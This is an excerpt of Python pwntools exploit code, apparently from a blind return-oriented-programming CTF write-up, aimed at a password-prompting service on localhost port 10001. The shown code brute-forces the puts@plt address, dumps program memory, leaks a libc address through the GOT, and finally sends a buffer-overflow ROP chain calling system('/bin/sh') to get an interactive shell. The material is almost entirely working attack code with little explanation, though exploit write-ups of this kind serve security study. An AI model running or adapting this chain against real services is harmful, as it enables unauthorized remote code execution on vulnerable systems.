...
def get_puts_plt(buffer_size, rdi_ret, stop_gardget):
    addr = 0x400000 - 1
    while True:
        addr += 1
        try:
            p = remote('127.0.0.1', 10001)
            p.readuntil('password?\n')
            payload = 'A' * buffer_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gardget)
            p.send(payload)
            data = p.recv()
            p.close()
...
get_puts_plt(buffer_size, rdi_ret, stop_gardget)
```
```
puts@plt  @ 0x400555
```
...
def dump_memory(buffer_size, rdi_ret, stop_gardget, puts_plt):
    addr = 0x400000
    ret = ''
    while addr < 0x401000:
        print hex(addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.readuntil('password?\n')
            payload = 'A' * buffer_size + p64(rdi_ret) + p64(addr) + p64(puts_plt) + p64(stop_gardget)
            p.send(payload)
            data = p.recv()
            p.close()
            if '\nWelCome' in data:
...
dump_memory(buffer_size, rdi_ret, stop_gardget, puts_plt)
```
...
p = remote('127.0.0.1', 10001)
p.readuntil('password?\n')
payload = 'A' * buffer_size + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gardget)
p.send(payload)
data = p.recvuntil('\nWelCome', drop = True)
...
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gardget)
p.sendline(payload)
p.interactive()
```
